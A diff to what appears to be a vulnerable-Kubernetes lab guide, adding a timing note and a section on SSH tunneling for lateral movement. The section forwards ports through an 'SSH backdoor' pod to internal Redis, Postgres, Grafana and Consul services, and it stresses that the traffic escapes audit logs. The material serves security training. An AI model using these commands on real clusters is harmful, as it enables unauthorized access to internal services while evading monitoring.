@@ -54,6 +54,8 @@ kubectl create configmap ssh-config \
 kubectl apply -f ssh-server.yaml
 ```
 
+> **Note:** The `apk add openssh-server` step takes ~15-20 seconds on first start while packages are downloaded and installed. The pod will stay in `ContainerCreating` or show `0/1 Ready` during this time — this is expected.
+
 Wait for the pod to be ready (the init step installs openssh-server from apk, which takes ~30 seconds):
 
 ```bash
@@ -175,6 +177,45 @@ for p in pods:
 kubectl get pods -n ssh-lab -o jsonpath='{.items[*].metadata.name}' | \
   xargs -n1 -I{} kubectl exec {} -n ssh-lab -- pgrep -a sshd 2>/dev/null
 ```
+
+## SSH Tunneling for Lateral Movement
+
+Beyond the API server tunnel shown in Step 6, SSH local port forwarding (`-L`) can reach any internal ClusterIP service — databases, dashboards, or other pods — making them accessible from the attacker's workstation without any Kubernetes credentials.
+
+### Example: Forward an internal ClusterIP service
+
+Suppose a Redis instance is running at `redis.default.svc.cluster.local:6379`. With the SSH tunnel already port-forwarded via `kubectl port-forward` (Step 4), open a new terminal:
+
+```bash
+# Forward local port 6379 to the internal Redis ClusterIP through the SSH backdoor
+ssh -i /tmp/dvka-ssh \
+  -o StrictHostKeyChecking=no \
+  -o UserKnownHostsFile=/dev/null \
+  -p 2222 root@localhost \
+  -L 6379:redis.default.svc.cluster.local:6379 \
+  -N &
+```
+
+Now the attacker can access the internal Redis service from their workstation:
+
+```bash
+# Query the internal Redis service through the tunnel
+curl -s telnet://localhost:6379 <<< "INFO server" || \
+  echo "Connect with: redis-cli -h localhost -p 6379"
+```
+
+This pattern works for any ClusterIP service — replace the target address and port:
+
+```bash
+# Generic pattern:
+# ssh -L LOCAL_PORT:CLUSTER_SERVICE:SERVICE_PORT -N
+# Examples:
+#   -L 5432:postgres.prod.svc.cluster.local:5432    (PostgreSQL)
+#   -L 3000:grafana.monitoring.svc.cluster.local:80  (Grafana dashboard)
+#   -L 8500:consul.default.svc.cluster.local:8500    (Consul API)
+```
+
+All traffic flows through the encrypted SSH tunnel, invisible to Kubernetes audit logs and most network monitoring tools.
 
 ## Cleanup
 
